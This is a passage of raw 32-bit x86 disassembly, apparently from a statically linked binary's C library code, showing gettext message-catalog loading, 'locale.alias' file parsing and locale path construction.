ror ax, 8
add edi, eax
test esi, esi
je 0x8061212
mov eax, dword [ebx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
cmp eax, 0xffffffff
je 0x8060be6
cmp eax, dword [var_98h_2]
jae 0x80611af
mov edx, dword [var_c4h_2]
mov eax, dword [edx + eax*4]
test eax, eax
je 0x8060bdc
mov dword [esp], eax
add ebx, 8
call fcn.08053400
add edi, eax
jmp 0x8060b82
mov dword [var_c8h], 0
mov eax, dword [var_c8h]
mov ecx, dword [var_c0h]
test eax, eax
mov dword [ebp + ecx*4 - 0x74], edi
je 0x8060c1c
inc ecx
cmp ecx, 1
mov dword [var_c0h], ecx
jbe 0x8060b2e
mov eax, dword [var_70h]
inc dword [var_a4h_2]
add eax, dword [var_74h]
add dword [var_a8h_2], eax
inc dword [var_bch_2]
mov ebx, dword [var_94h_2]
cmp dword [var_bch_2], ebx
jb 0x8060b1a
mov eax, dword [var_a4h]
shl eax, 4
add dword [var_a8h], eax
mov eax, dword [var_a4h]
test eax, eax
jne 0x8060c6d
mov ecx, dword [var_8ch_2]
mov dword [ecx + 0x20], 0
mov dword [ecx + 0x24], 0
mov dword [ecx + 0x28], 0
jmp 0x806092d
mov eax, dword [var_a8h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_ach], eax
je 0x80611af
mov edx, dword [var_8ch]
mov ecx, eax
mov dword [var_b0h], eax
mov ebx, ecx
mov dword [var_bch], 0
mov dword [var_cch], 0
mov ecx, dword [var_94h]
mov dword [edx + 0x10], eax
mov eax, dword [var_a4h]
shl eax, 3
add ebx, eax
add eax, ebx
mov dword [var_b4h], ebx
cmp dword [var_bch], ecx
mov dword [var_b8h], eax
mov eax, dword [edx + 0x2c]
mov edx, dword [var_b8h]
lea eax, [edx + eax*4]
mov dword [var_ach], eax
jae 0x8060f21
mov ebx, dword [var_8ch_2]
mov ecx, 1
mov dword [var_c0h], 0
mov esi, dword [ebx + 0xc]
test esi, esi
je 0x8061177
mov eax, dword [var_c0h]
test eax, eax
jne 0x8061166
mov edx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
mov eax, dword [ebx + edx*4]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_84h_2]
test esi, esi
lea edx, [eax + 4]
je 0x806115d
mov eax, dword [edx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
je 0x8060d86
test esi, esi
je 0x8061155
mov eax, dword [edx + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
cmp eax, 0xffffffff
je 0x8060d86
mov ebx, dword [var_c4h_2]
mov eax, dword [ebx + eax*4]
test eax, eax
je 0x8060d84
add edx, 8
jmp 0x8060d57
xor ecx, ecx
test ecx, ecx
je 0x8060f09
inc dword [var_c0h]
cmp dword [var_c0h], 1
jbe 0x8060d05
mov dword [var_c0h], 0
test esi, esi
je 0x8061117
mov eax, dword [var_c0h]
test eax, eax
jne 0x8061103
mov edx, dword [var_bch_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [ecx + edx*4]
mov edx, dword [var_84h_2]
ror ax, 8
ror eax, 0x10
ror ax, 8
add edx, eax
test esi, esi
je 0x80610f0
mov eax, dword [edx]
ror ax, 8
ror eax, 0x10
ror ax, 8
add eax, dword [var_84h_2]
mov dword [var_d0h], eax
mov eax, dword [var_cch_2]
lea edi, [edx + 4]
mov ebx, dword [var_c0h]
mov edx, dword [var_b0h_2]
shl eax, 3
add edx, eax
add eax, dword [var_b4h_2]
test ebx, ebx
cmove eax, edx
test esi, esi
mov dword [var_d4h], eax
je 0x80610e7
mov eax, dword [edi + 4]
ror ax, 8
ror eax, 0x10
ror ax, 8
inc eax
je 0x80610bc
mov edx, dword [ebp - 0xac]
mov eax, dword [ebp - 0xd4]
mov dword [eax + 4], edx
nop
lea esi, [esi]
test esi, esi
je 0x80610b5
mov ebx, dword [edi]
ror bx, 8
ror ebx, 0x10
ror bx, 8
test esi, esi
je 0x80610ad
mov esi, dword [edi + 4]
ror si, 8
ror esi, 0x10
ror si, 8
test ebx, ebx
jne 0x8061080
cmp esi, 0xffffffff
je 0x8060ed5
mov edx, dword [ebp - 0xc4]
add edi, 8
mov ebx, dword [edx + esi*4]
mov dword [esp], ebx
call fcn.08053400
mov ecx, dword [ebp - 0xac]
mov dword [esp + 4], ebx
mov esi, eax
mov dword [esp + 8], eax
mov dword [esp], ecx
call fcn.08053770
mov ebx, dword [ebp - 0x8c]
add dword [ebp - 0xac], esi
mov esi, dword [ebx + 0xc]
jmp 0x8060e60
mov edx, dword [ebp - 0xd4]
mov eax, dword [ebp - 0xac]
sub eax, dword [edx + 4]
mov dword [edx], eax
inc dword [ebp - 0xc0]
cmp dword [ebp - 0xc0], 1
ja 0x8060f03
mov eax, dword [ebp - 0x8c]
mov esi, dword [eax + 0xc]
jmp 0x8060dab
inc dword [ebp - 0xcc]
inc dword [var_bch_2]
mov ecx, dword [var_94h_2]
cmp dword [var_bch_2], ecx
jb 0x8060ced
mov ebx, dword [var_a4h]
cmp dword [var_cch], ebx
jne 0x8061478
mov edx, dword [var_8ch_2]
xor eax, eax
mov dword [var_bch_2], 0
cmp eax, dword [edx + 0x2c]
jae 0x8060f93
mov edx, dword [edx + 0x30]
mov ebx, dword [var_8ch_2]
mov ecx, dword [ebx + 0x34]
test ecx, ecx
je 0x8061071
mov ecx, dword [var_bch_2]
mov eax, dword [edx + ecx*4]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_bch_2]
mov ebx, dword [var_b8h_2]
mov dword [ebx + ecx*4], eax
mov eax, dword [var_8ch_2]
inc ecx
mov dword [var_bch_2], ecx
cmp ecx, dword [eax + 0x2c]
jb 0x8060f4d
mov dword [var_bch_2], 0
mov edx, dword [var_a4h_2]
cmp dword [var_bch_2], edx
jb 0x8060fe1
mov eax, dword [var_8ch_2]
mov edx, dword [var_a4h_2]
mov ecx, dword [var_b0h_2]
mov ebx, dword [var_b4h_2]
mov dword [eax + 0x20], edx
mov dword [eax + 0x34], 0
mov edx, dword [var_b8h_2]
mov dword [eax + 0x24], ecx
mov dword [eax + 0x28], ebx
mov dword [eax + 0x30], edx
jmp 0x806092d
mov ecx, dword [var_bch_2]
mov ebx, dword [var_b0h_2]
mov eax, dword [ebx + ecx*8 + 4]
mov dword [esp], eax
call fcn.08062bb0
xor edx, edx
mov esi, eax
mov eax, dword [var_8ch_2]
mov edi, dword [eax + 0x2c]
mov eax, esi
div edi
mov eax, esi
mov ebx, edx
lea edx, [edi - 2]
mov ecx, edx
xor edx, edx
div ecx
lea esi, [edx + 1]
mov eax, dword [var_b8h_2]
mov edx, dword [eax + ebx*4]
test edx, edx
je 0x806103b
mov eax, edi
mov ecx, ebx
lea edx, [esi + ebx]
sub eax, esi
sub ecx, eax
cmp ebx, eax
mov ebx, ecx
cmovb ebx, edx
jmp 0x806101a
mov edx, dword [var_8ch_2]
mov eax, dword [var_bch_2]
mov ecx, dword [var_b8h_2]
inc dword [var_bch_2]
add eax, dword [edx + 0x14]
inc eax
mov dword [ecx + ebx*4], eax
mov ebx, dword [var_a4h_2]
cmp dword [var_bch_2], ebx
jb 0x8060fe1
jmp 0x8060fab
mov ebx, dword [var_bch_2]
mov eax, dword [edx + ebx*4]
jmp 0x8060f72
nop
mov ecx, dword [ebp - 0xd0]
mov eax, dword [ebp - 0xac]
mov dword [esp + 8], ebx
mov dword [esp + 4], ecx
mov dword [esp], eax
call fcn.08053770
add dword [ebp - 0xac], ebx
add dword [ebp - 0xd0], ebx
jmp 0x8060e93
mov esi, dword [edi + 4]
jmp 0x8060e8b
mov ebx, dword [edi]
jmp 0x8060e75
test esi, esi
je 0x80610e3
mov eax, dword [edi]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [ebp - 0xd4]
mov ebx, dword [ebp - 0xd0]
mov dword [ecx], eax
mov dword [ecx + 4], ebx
jmp 0x8060ee6
mov eax, dword [edi]
jmp 0x80610cd
cmp dword [edi + 4], 0xffffffff
jmp 0x8060e46
mov ebx, dword [var_84h_2]
add ebx, dword [edx]
mov dword [var_d0h], ebx
jmp 0x8060e04
mov ebx, dword [var_bch_2]
mov edx, dword [var_a0h_2]
mov eax, dword [edx + ebx*4]
jmp 0x8060dd0
mov edi, dword [var_c0h]
test edi, edi
jne 0x806113b
mov ecx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
mov edx, dword [var_84h_2]
add edx, dword [ebx + ecx*4]
jmp 0x8060de3
mov eax, dword [var_bch_2]
mov ecx, dword [var_a0h_2]
mov edx, dword [var_84h_2]
add edx, dword [ecx + eax*4]
jmp 0x8060de3
mov eax, dword [edx + 4]
jmp 0x8060d6d
cmp dword [edx + 4], 0xffffffff
jmp 0x8060d55
mov edx, dword [var_bch_2]
mov ebx, dword [var_a0h_2]
jmp 0x8060d27
mov eax, dword [var_c0h]
test eax, eax
jne 0x806119b
mov eax, dword [var_84h_2]
mov edx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
add eax, dword [ebx + edx*4]
jmp 0x8060d3b
mov eax, dword [var_84h_2]
mov edx, dword [var_bch_2]
mov ebx, dword [var_a0h_2]
jmp 0x8061193
mov edx, dword [var_8ch]
mov eax, dword [edx + 0x10]
test eax, eax
jne 0x8061208
mov eax, dword [var_88h]
test eax, eax
je 0x80611f8
mov ecx, dword [var_80h]
mov ebx, dword [var_84h]
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.08054780
mov edx, dword [var_8ch]
mov dword [esp], edx
call fcn.08051180
mov ecx, dword [var_78h]
mov dword [ecx + 8], 0
jmp 0x8060955
mov eax, dword [var_84h]
mov dword [esp], eax
call fcn.08051180
jmp 0x80611db
mov dword [esp], eax
call fcn.08051180
jmp 0x80611bc
mov eax, dword [ebx + 4]
jmp 0x8060baf
add edi, dword [ebx]
jmp 0x8060b99
cmp dword [ebx + 4], 0xffffffff
jmp 0x8060b80
mov ebx, dword [var_bch_2]
mov edx, dword [var_a0h_2]
mov eax, dword [edx + ebx*4]
jmp 0x8060b53
mov edx, dword [var_c0h]
test edx, edx
jne 0x8061262
mov ecx, dword [var_bch_2]
mov ebx, dword [var_9ch_2]
mov eax, dword [var_84h_2]
add eax, dword [ebx + ecx*4]
jmp 0x8060b64
mov edx, dword [var_bch_2]
mov ecx, dword [var_a0h_2]
mov eax, dword [var_84h_2]
add eax, dword [ecx + edx*4]
jmp 0x8060b64
mov ecx, dword [var_84h]
add ecx, dword [ecx + 0x2c]
mov dword [var_a0h], ecx
jmp 0x8060ae2
mov ebx, dword [var_84h]
add ebx, dword [ebx + 0x28]
mov dword [var_9ch], ebx
jmp 0x8060abe
mov ecx, dword [var_bch_2]
mov eax, dword [ebx + ecx*8]
jmp 0x8060a48
mov ecx, dword [var_bch_2]
mov edx, dword [var_84h_2]
add edx, dword [ebx + ecx*8 + 4]
jmp 0x8060a2c
mov ebx, dword [var_84h]
add ebx, dword [ebx + 0x20]
jmp 0x80609d5
mov ecx, dword [var_84h]
mov ecx, dword [ecx + 0x1c]
mov dword [var_98h], ecx
jmp 0x80609b7
mov ebx, dword [var_8ch]
mov dword [ebx + 0x20], 0
mov dword [ebx + 0x24], 0
mov dword [ebx + 0x28], 0
jmp 0x806092d
mov ebx, dword [var_84h]
mov ebx, dword [ebx + 0x24]
mov dword [var_94h], ebx
jmp 0x8060987
mov ecx, dword [var_84h_2]
add ecx, dword [ecx + 0x18]
jmp 0x8060907
mov ecx, dword [var_84h]
mov eax, dword [ecx + 0x14]
jmp 0x80608d9
mov eax, dword [var_84h]
add eax, dword [eax + 0x10]
jmp 0x80608b4
mov eax, dword [var_84h]
add eax, dword [eax + 0xc]
jmp 0x806088d
mov ecx, dword [var_84h]
mov eax, dword [ecx + 8]
jmp 0x8060866
mov eax, dword [var_84h]
mov ebx, dword [eax + 4]
jmp 0x8060831
cmp eax, 0xde120495
je 0x80607cd
mov esi, dword [var_88h_2]
test esi, esi
je 0x806139a
mov ecx, dword [var_80h_2]
mov dword [esp], edx
mov dword [var_4h], ecx
call fcn.08054780
jmp 0x8060955
mov ebx, dword [var_84h_2]
mov dword [esp], ebx
call fcn.08051180
jmp 0x8060955
mov eax, dword [var_80h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_84h], eax
je 0x8060955
mov esi, dword [var_80h]
mov dword [var_90h], eax
mov ebx, edi
mov ecx, dword [var_90h]
mov edx, esi
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov dword [var_d8h], eax
ja 0x8061438
mov eax, dword [var_d8h]
test eax, eax
jle 0x8061417
mov eax, dword [var_d8h_2]
add dword [var_90h_2], eax
sub esi, eax
test esi, esi
jne 0x80613cf
mov ebx, edi
mov eax, 6
int 0x80
jmp 0x80607ba
cmp dword [var_d8h], 0xffffffff
jne 0x806142a
call fcn.08048b20
cmp dword [eax], 4
je 0x8061405
mov ebx, edi
mov eax, 6
int 0x80
jmp 0x8060955
call fcn.08048b20
neg dword [var_d8h]
mov edx, dword [var_d8h]
mov dword [var_d8h], 0xffffffff
mov dword [eax], edx
jmp 0x80613ed
mov ebx, edi
mov eax, 6
int 0x80
jmp 0x8060955
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x806071a
call fcn.08062c50
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
test eax, eax
mov dword [var_18h], 0
mov edi, dword [arg_8h]
je 0x80614a8
mov dword [esp], 0x80aa950
call section.
mov edx, dword [0x80aa970]
xor eax, eax
mov dword [var_14h], edi
test edx, edx
jne 0x8061561
test eax, eax
jne 0x8061559
mov ecx, dword [0x80a9b00]
xor esi, esi
cmp byte [ecx], 0
je 0x806150c
cmp byte [ecx], 0x3a
je 0x8061540
movzx eax, byte [ecx]
mov ebx, ecx
test al, al
je 0x80614f7
cmp al, 0x3a
je 0x80614f7
mov eax, ecx
inc ecx
mov dword [0x80a9b00], ecx
movzx eax, byte [eax + 1]
test al, al
je 0x80614f7
cmp al, 0x3a
jne 0x80614e2
cmp ebx, ecx
jb 0x806152c
test esi, esi
jne 0x80614a8
mov edx, dword [0x80a9b00]
cmp byte [edx], 0
mov ecx, edx
jne 0x80614d0
mov eax, 0
test eax, eax
je 0x8061521
mov dword [esp], 0x80aa950
call section.
mov eax, dword [var_18h]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
sub ecx, ebx
mov eax, ebx
mov edx, ecx
call fcn.08061590
mov esi, eax
jmp 0x80614fb
nop
lea esi, [esi]
lea edx, [ecx + 1]
mov dword [0x80a9b00], edx
mov ecx, edx
lea edx, [edx + 1]
cmp byte [edx - 1], 0x3a
je 0x8061543
jmp 0x80614d5
mov eax, dword [eax + 4]
mov dword [var_18h], eax
jmp 0x806150c
mov eax, dword [0x80aad90]
mov dword [var_10h], fcn.08061b10
mov dword [var_ch], 8
mov dword [var_8h], edx
mov dword [var_4h], eax
lea eax, [var_14h]
mov dword [esp], eax
call fcn.08062e40
jmp 0x80614bb
mov esi, esi
push ebp
lea ecx, [edx + 0x20]
mov ebp, esp
and ecx, 0xfffffffc
push edi
push esi
push ebx
sub esp, 0x1c4
sub esp, ecx
lea ebx, [var_1fh]
mov dword [var_8h], edx
mov dword [var_4h], eax
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.08053740
mov dword [var_4h], str._locale.alias
mov dword [var_8h], 0xe
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], 0x8093820
mov dword [esp], ebx
call fcn.0804a250
xor edx, edx
mov dword [var_1a0h], eax
test eax, eax
je 0x8061909
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov edx, dword [var_1a0h]
mov dword [var_1a4h], 0
test byte [edx], 0x10
jne 0x80618eb
lea esi, [esi]
mov ecx, dword [var_1a0h]
lea eax, [var_19ch]
mov dword [var_4h], 0x190
mov dword [esp], eax
mov dword [var_8h], ecx
call fcn.08076c40
test eax, eax
je 0x80618eb
lea edx, [var_19ch]
mov dword [var_4h], 0xa
lea esi, [var_19ch]
mov dword [esp], edx
call fcn.08076ce0
test eax, eax
setne al
movzx eax, al
mov dword [var_1a8h], eax
mov ecx, 0
mov ebx, 0x80aad18
test ecx, ecx
je 0x806168e
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8061a8e
movzx ebx, byte [esi]
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
je 0x80616a8
inc esi
jmp 0x8061672
test bl, bl
je 0x80618d2
cmp bl, 0x23
je 0x80618d2
mov dword [var_1ach], esi
nop
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x8061701
mov edx, 0
mov edi, 0x80aad18
test edx, edx
je 0x80616e4
mov dword [esp], 4
call section.
mov edi, eax
mov edx, dword [edi]
test edx, edx
je 0x8061a5c
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
je 0x80616c0
test bl, bl
je 0x8061701
mov byte [esi], 0
nop
inc esi
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806171d
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8061a2d
movzx ebx, byte [esi]
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
jne 0x8061700
test bl, bl
je 0x80618d2
mov dword [var_1b4h], esi
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x806177a
mov ecx, 0
mov edi, 0x80aad18
test ecx, ecx
je 0x8061766
mov dword [esp], 4
call section.
mov edi, eax
mov edx, dword [edi]
test edx, edx
je 0x80619fb
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
je 0x8061742
cmp bl, 0xa
je 0x80619ef
test bl, bl
je 0x806178a
mov byte [esi], 0
mov eax, dword [0x80aa974]
cmp dword [0x80aa970], eax
jae 0x80619d7
mov edx, dword [var_1ach]
mov dword [esp], edx
call fcn.08053400
mov ecx, dword [var_1b4h]
lea edi, [eax + 1]
mov dword [esp], ecx
call fcn.08053400
mov ecx, dword [0x80aa96c]
mov edx, dword [0x80aa968]
inc eax
mov dword [var_1b0h], eax
lea eax, [edi + edx]
add eax, dword [var_1b0h]
cmp eax, ecx
jbe 0x80619c6
mov edx, dword [var_1b0h]
lea eax, [edx + edi]
mov edx, 0x400
cmp eax, 0x3ff
cmovbe eax, edx
add ecx, eax
mov eax, dword [section.__libc_freeres_ptrs]
mov dword [var_1b8h], ecx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.08051220
mov edx, dword [var_1a4h]
test eax, eax
mov dword [var_1c0h], eax
je 0x8061909
mov eax, dword [section.__libc_freeres_ptrs]
cmp eax, dword [var_1c0h]
jne 0x8061987
mov esi, dword [0x80aa970]
mov ebx, dword [0x80aad90]
mov edx, dword [var_1b8h]
mov eax, dword [var_1c0h]
mov dword [0x80aa96c], edx
mov dword [section.__libc_freeres_ptrs], eax
mov edx, dword [0x80aa968]
add edx, dword [section.__libc_freeres_ptrs]
mov ecx, dword [var_1ach]
mov dword [var_8h], edi
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08053770
mov ecx, dword [var_1b4h]
mov edx, dword [0x80aa968]
mov dword [ebx + esi*8], eax
mov eax, dword [var_1b0h]
mov esi, dword [0x80aa970]
mov ebx, dword [0x80aad90]
mov dword [var_4h], ecx
add edx, edi
mov dword [var_8h], eax
mov dword [0x80aa968], edx
add edx, dword [section.__libc_freeres_ptrs]
mov dword [esp], edx
call fcn.08053770
inc dword [var_1a4h]
mov dword [ebx + esi*8 + 4], eax
inc dword [0x80aa970]
mov eax, dword [var_1b0h]
add dword [0x80aa968], eax
mov edx, dword [var_1a8h]
test edx, edx
je 0x8061940
mov edx, dword [var_1a0h]
test byte [edx], 0x10
je 0x8061620
mov ecx, dword [var_1a0h]
mov dword [esp], ecx
call fcn.08049dc0
mov eax, dword [var_1a4h]
test eax, eax
jne 0x8061913
mov edx, dword [var_1a4h]
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80aa970]
mov dword [var_sp_ch], fcn.08061b10
mov dword [var_8h], 8
mov dword [var_4h], eax
mov eax, dword [0x80aad90]
mov dword [esp], eax
call fcn.08063070
jmp 0x8061903
nop
lea esi, [esi]
mov edx, dword [var_1a0h]
lea ecx, [var_19ch]
mov dword [var_4h], 0x190
mov dword [esp], ecx
mov dword [var_8h], edx
call fcn.08076c40
test eax, eax
je 0x80618dc
lea eax, [var_19ch]
mov dword [var_4h], 0xa
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x8061940
jmp 0x80618dc
mov esi, dword [0x80aa970]
xor edx, edx
cmp edx, esi
mov dword [var_1bch], esi
jae 0x8061838
mov ebx, dword [0x80aad90]
mov ecx, dword [var_1c0h]
sub ecx, eax
add dword [ebx + edx*8 + 4], ecx
add dword [ebx + edx*8], ecx
inc edx
cmp edx, dword [var_1bch]
jae 0x806183e
mov eax, dword [section.__libc_freeres_ptrs]
jmp 0x80619a3
mov esi, dword [0x80aa970]
mov ebx, dword [0x80aad90]
jmp 0x806185b
call fcn.08061ac0
mov edx, dword [var_1a4h]
test eax, eax
je 0x806179b
jmp 0x8061909
mov byte [esi], 0
mov byte [esi + 1], 0xa
jmp 0x806178a
mov eax, 0
test eax, eax
je 0x8061a26
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [edi], eax
mov edx, eax
movzx ebx, byte [esi]
jmp 0x8061770
mov eax, dword [0x80a9ab4]
jmp 0x8061a10
mov edx, 0
test edx, edx
je 0x8061a55
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8061727
mov eax, dword [0x80a9ab4]
jmp 0x8061a42
mov ecx, 0
test ecx, ecx
je 0x8061a87
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [edi], eax
mov edx, eax
movzx ebx, byte [esi]
jmp 0x80616ee
mov eax, dword [0x80a9ab4]
jmp 0x8061a71
mov eax, 0
test eax, eax
je 0x8061ab6
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8061698
mov eax, dword [0x80a9ab4]
jmp 0x8061aa3
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80aa974]
mov dword [var_4h], ebx
mov ebx, 0x64
lea edx, [eax + eax]
test eax, eax
cmovne ebx, edx
lea eax, [ebx*8]
mov dword [var_sp_4h], eax
mov eax, dword [0x80aad90]
mov dword [esp], eax
call fcn.08051220
mov edx, 0xffffffff
test eax, eax
je 0x8061b09
mov dword [0x80aad90], eax
mov dword [0x80aa974], ebx
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08077440
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x40
mov eax, dword [arg_18h]
mov edi, dword [arg_14h]
mov dword [esp], eax
call fcn.08053400
mov ebx, dword [arg_10h]
add ebx, eax
test edi, 4
mov esi, ebx
je 0x8061b75
mov edx, dword [arg_1ch]
mov dword [esp], edx
call fcn.08053400
lea esi, [eax + ebx + 1]
test edi, 2
mov ebx, esi
je 0x8061b8e
mov eax, dword [arg_20h]
mov dword [esp], eax
call fcn.08053400
lea ebx, [eax + esi + 1]
test edi, 1
mov esi, ebx
je 0x8061ba7
mov edx, dword [arg_24h]
mov dword [esp], edx
call fcn.08053400
lea esi, [eax + ebx + 1]
mov eax, dword [arg_2ch]
mov dword [esp], eax
call fcn.08053400
test edi, 8
mov ebx, eax
lea eax, [eax + esi + 2]
je 0x8061bd2
mov edx, dword [arg_28h]
mov dword [esp], edx
call fcn.08053400
lea eax, [eax + esi]
lea eax, [ebx + eax + 3]
mov dword [esp], eax
call fcn.08050fe0
mov esi, eax
xor eax, eax
test esi, esi
je 0x8061cca
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [esp], esi
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.08053770
mov eax, dword [arg_10h]
mov dword [var_8h], 0x3a
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.080775c0
mov edx, dword [arg_10h]
lea eax, [edx + esi]
mov byte [eax - 1], 0x2f
mov dword [esp], eax
mov edx, dword [arg_18h]
mov dword [var_4h], edx
call fcn.080773c0
test edi, 4
jne 0x8061f1e
test edi, 2
jne 0x8061f06
test edi, 1
jne 0x8061eee
test edi, 8
jne 0x8061ed6
mov byte [eax], 0x2f
mov edx, dword [arg_2ch]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
mov eax, dword [arg_8h]
mov dword [var_10h], 0
mov eax, dword [eax]
test eax, eax
mov dword [var_14h], eax
je 0x8061cb8
mov edx, dword [var_14h]
mov eax, dword [edx]
test eax, eax
je 0x8061cab
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8061ec6
jl 0x8061eba
mov eax, dword [var_14h]
mov dword [var_10h], eax
mov edx, dword [var_14h]
mov edx, dword [edx + 0xc]
test edx, edx
mov dword [var_14h], edx
jne 0x8061c82
mov ebx, dword [arg_30h]
test ebx, ebx
jne 0x8061cd2
mov dword [esp], esi
call fcn.08051180
mov eax, dword [var_14h]
add esp, 0x40
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.080774c0
mov ecx, edi
mov edx, edi
and edx, 0xffffaaaa
and ecx, 0x5555
sar edx, 1
lea ebx, [ecx + edx]
mov edx, ebx
mov ecx, ebx
and edx, 0xffffcccc
and ecx, 0x3333
sar edx, 2
lea ebx, [ecx + edx]
mov edx, ebx
sar edx, 4
lea ebx, [ebx + edx]
and ebx, 0xf0f
mov ecx, ebx
sar ecx, 8
add ecx, ebx
shl eax, cl
lea eax, [eax*4 + 0x14]
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_14h], eax
mov ecx, dword [var_14h]
xor eax, eax
test ecx, ecx
je 0x8061cca
mov eax, dword [var_14h]
mov edx, dword [arg_10h]
xor ebx, ebx
mov dword [eax], esi
mov eax, dword [arg_ch]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080774c0
dec eax
je 0x8061ea7
mov ebx, 1
mov edx, dword [var_14h]
mov dword [edx + 4], ebx
mov dword [edx + 8], 0
mov edx, dword [var_10h]
test edx, edx
je 0x8061e92
mov edx, dword [var_10h]
mov eax, dword [edx + 0xc]
mov edx, dword [var_14h]
mov dword [edx + 0xc], eax
mov eax, dword [var_10h]
mov dword [eax + 0xc], edx
mov edx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_18h], 0
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080774c0
lea edx, [edi - 1]
dec eax
cmovne edx, edi
test edx, edx
mov dword [var_1ch], edx
js 0x8061dcf
not edi
mov dword [var_20h], edi
lea esi, [esi]
xor edi, edi
mov edx, dword [var_20h]
test dword [var_1ch], edx
je 0x8061de4
dec dword [var_1ch]
jns 0x8061dc0
mov eax, dword [var_18h]
mov edx, dword [var_14h]
mov dword [edx + eax*4 + 0x10], 0
mov eax, edx
jmp 0x8061cca
test edi, edi
mov eax, edi
je 0x8061e82
mov ebx, dword [arg_ch]
add ebx, dword [arg_10h]
cmp edi, ebx
jb 0x8061e6c
xor esi, esi
cmp eax, ebx
cmovb esi, eax
test esi, esi
mov edi, esi
je 0x8061dca
mov ebx, dword [var_18h]
mov dword [esp], esi
inc dword [var_18h]
call fcn.08053400
mov dword [var_4h], esi
mov edx, dword [arg_2ch]
inc eax
mov dword [var_28h], 1
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_24h], edx
mov edx, dword [arg_28h]
mov dword [esp], eax
mov dword [var_sp_20h], edx
mov edx, dword [arg_24h]
mov dword [var_sp_1ch], edx
mov edx, dword [arg_20h]
mov dword [var_sp_18h], edx
mov edx, dword [arg_1ch]
mov dword [var_sp_14h], edx
mov edx, dword [arg_18h]
mov dword [var_sp_10h], edx
mov edx, dword [var_1ch]
mov dword [var_ch], edx
call fcn.08061b40
mov edx, dword [var_14h]
mov dword [edx + ebx*4 + 0x10], eax
jmp 0x8061de4
mov dword [var_4h], 0
mov dword [esp], edi
call fcn.080537a0
inc eax
jmp 0x8061df8
mov eax, dword [arg_10h]
mov esi, dword [arg_ch]
test eax, eax
cmove esi, edi
jmp 0x8061dff
mov edx, dword [arg_8h]
mov eax, dword [edx]
mov edx, dword [var_14h]
mov dword [edx + 0xc], eax
mov eax, dword [arg_8h]
mov dword [eax], edx
jmp 0x8061d90
mov eax, edi
and eax, 3
cmp eax, 3
jne 0x8061d66
jmp 0x8061d61
mov dword [var_14h], 0
jmp 0x8061cb8
mov eax, dword [var_14h]
test eax, eax
jne 0x8061cbf
jmp 0x8061cb8
mov byte [eax], 0x40
mov edx, dword [arg_28h]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c5c
mov byte [eax], 0x2e
mov edx, dword [arg_24h]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c50
mov byte [eax], 0x2e
